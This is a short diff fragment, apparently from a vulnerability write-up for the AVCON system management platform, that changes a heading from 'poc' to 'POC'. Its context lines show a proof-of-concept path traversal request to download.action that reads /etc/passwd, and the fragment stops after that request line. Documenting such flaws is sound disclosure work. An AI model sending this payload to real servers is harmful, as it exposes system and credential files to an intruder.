@@ -9,7 +9,7 @@ title="AVCON-系统管理平台"
 ```
 
 
-## poc
+## POC
 
 ```java
 GET /download.action?filename=../../../../../../../../etc/passwd HTTP/1.1
